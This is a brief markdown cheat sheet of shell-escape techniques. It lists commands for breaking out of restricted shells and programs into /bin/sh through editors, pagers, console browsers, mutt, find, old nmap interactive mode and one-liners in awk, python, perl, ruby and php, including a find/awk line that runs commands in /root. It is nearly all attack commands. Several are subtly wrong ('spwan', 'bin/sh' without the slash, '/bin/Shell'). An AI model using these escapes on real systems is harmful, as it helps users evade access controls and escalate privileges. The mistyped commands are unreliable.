# shell-escaping

## editors 

### vim 

```
:!/bin/sh
```

```
:set shell=/bin/sh
:shell
```

### ed

```
!'/bin/sh'
```

### ne

```
Load Prefs
```

## Pager


### More/Less

Open a file that is larger then your terminal. 

Run `!'sh'`

### man

Run `!'sh'`

This to works sinse man uses more/less.

### pinfo

press `!` followed by the command you want to run.

### Console Browsers

pagers can also be used a editors in console browsers.

#### links

`FILE > OS Shell`

#### lynx

open webpage.  
press `o`  
configure vim as editor

or

```
lynx --editor=/usr/bin/vim www.google.com
```

#### elinks

```
export EDITOR=/usr/bin/vim
```

open a site with a textbox. 
Press `ENTER` and then `F4`. 
elinks will use vim.

### mutt

open mutt  
press `!`  
enter `/bin/Shell`

### find

when ever it finds udp,xml it will cd to root and run ls.

`find . -name udp.xml -exec awk 'BEGIN {system("cd /root; ls")}' \;`

### nmap

before version r17131

```
nmap --interactive
!sh
```

## Programming Techniques

### awk

`awk 'BEGIN {system("/bin/sh")}'`

### expect

```
Expect
spwan sh
sh
```

### python

`python -c 'import os; os.system("/bin/sh");'`

### ruby

```
irb
exec 'bin/sh'
```

### perl

`perl -e 'system("sh -i")'`  
`perl -e 'exec("sh -i")'`

### php

```
php -a
exec("sh -i");
```
